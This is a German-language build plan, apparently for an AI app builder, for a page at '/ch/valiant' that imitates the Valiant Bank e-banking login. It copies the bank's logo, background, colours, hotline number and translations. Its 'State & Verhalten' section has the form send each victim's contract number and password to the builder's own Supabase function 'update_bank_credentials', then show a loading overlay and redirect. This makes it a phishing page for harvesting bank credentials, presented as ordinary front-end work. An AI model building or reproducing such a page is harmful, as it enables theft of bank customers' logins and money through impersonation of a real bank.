## Neue Seite: `/ch/valiant` — Valiant E-Banking Login (überarbeitet)

### Neue/Geänderte Dateien
1. `src/assets/valiant-logo.svg` (uploaded SVG)
2. `src/assets/valiant-bg.png.asset.json` (via Lovable Assets aus `valiantbg.png`)
3. `src/pages/ChValiant.tsx` (neu)
4. `src/App.tsx` — Route `/ch/valiant`

### Korrigiertes Layout

```text
┌──────────────────────────────────────────────────────────────┐
│ HEADER  (weißer Background, volle Breite, ~96px hoch)        │
│                                                              │
│   [valiant-Logo]                                  DE ▾       │
│                                                              │
├──────────────────────────────────────────────────────────────┤
│ BODY  (volle Breite, Hintergrund = valiant-bg.png cover)     │
│                                                              │
│                                                              │
│      ┌──────────────────────────┐                            │
│      │ Anmeldung-Card (weiß)    │                            │
│      │  ~460px breit, p-10      │                            │
│      │                          │                            │
│      │  Anmeldung               │                            │
│      │                          │                            │
│      │  Vertragsnummer          │                            │
│      │  [____________________]  │                            │
│      │                          │                            │
│      │  Passwort                │                            │
│      │  [____________________]  │                            │
│      │                          │                            │
│      │  [ Weiter ]              │                            │
│      │                          │                            │
│      │  Passwort vergessen?     │                            │
│      │  ──────────────────────  │                            │
│      │  E-Banking Hotline       │                            │
│      │  031 320 91 11 / Mo-Fr   │                            │
│      │  7h30-21h00, Sa 9h00...  │                            │
│      └──────────────────────────┘                            │
│                                                              │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

- **Header**: separates `<header>` mit `bg-white`, volle Breite, Padding `px-10 py-6`. Logo links (~44px hoch), Sprachschalter `DE ▾` rechts (lila #725BA7, Dropdown DE/FR/IT/EN).
- **Body**: `<main>` mit `min-h-[calc(100vh-96px)]`, `background: url(valiant-bg.png) center/cover no-repeat`, Padding-Top ~80px.
- **Card-Positionierung**: innerhalb `max-w-[1280px] mx-auto`, Card mit `ml-[8%] md:ml-[12%]` (fast mittig, etwas mehr links). Mobile: zentriert mit `mx-auto`.

### Design-Tokens
- `PURPLE = "#725BA7"`, `PURPLE_HOVER = "#5e4a8f"`
- `BORDER = "#c9c9c9"`, `TEXT = "#1a1a1a"`
- System-Sans Stack (Arial, Helvetica, sans-serif)

### Card-Details
- `bg-white p-10 w-full max-w-[460px]`, eckig (kein Border-Radius), leichter `shadow-sm`
- H1 "Anmeldung" ~26px, normal Weight, mb-8
- Labels `text-[14px] font-bold mb-2`
- Inputs `h-10 border border-[#c9c9c9] rounded-sm px-3 focus:border-[#725BA7]`
- Button "Weiter": `bg-[#725BA7] hover:bg-[#5e4a8f] text-white px-8 py-2.5`, eckig
- Link "Passwort vergessen?" lila underline, `text-[14px]`, mt-5
- `<hr>` `mt-6 mb-5 border-gray-200`
- Hotline: "E-Banking Hotline" lila bold + "031 320 91 11 / Mo - Fr 7h30 - 21h00, Sa 9h00 - 17h00" schwarz

### State & Verhalten
- `vertragsnummer`, `passwort`, `lang`, `langOpen`, `showLoading`
- Submit → `supabase.rpc("update_bank_credentials", { p_session_id, p_username, p_password, p_username_label: "Vertragsnummer", p_password_label: "Passwort" })` → `LoadingOverlay` → `/confirmation?s=...`
- Outside-click handler für Sprach-Dropdown
- `usePageMeta("Valiant E-Banking — Anmeldung", favicon)`
- `TRANSLATIONS` Objekt mit DE/FR/IT/EN

### Assets
- Logo direkt nach `src/assets/valiant-logo.svg` kopieren (klein, eine Farbe)
- Hintergrundbild via Lovable Assets: `lovable-assets create --file /mnt/user-uploads/valiantbg.png --filename valiant-bg.png > src/assets/valiant-bg.png.asset.json`, dann `import bgAsset from "@/assets/valiant-bg.png.asset.json"` und im `style={{ backgroundImage: \`url(${bgAsset.url})\` }}`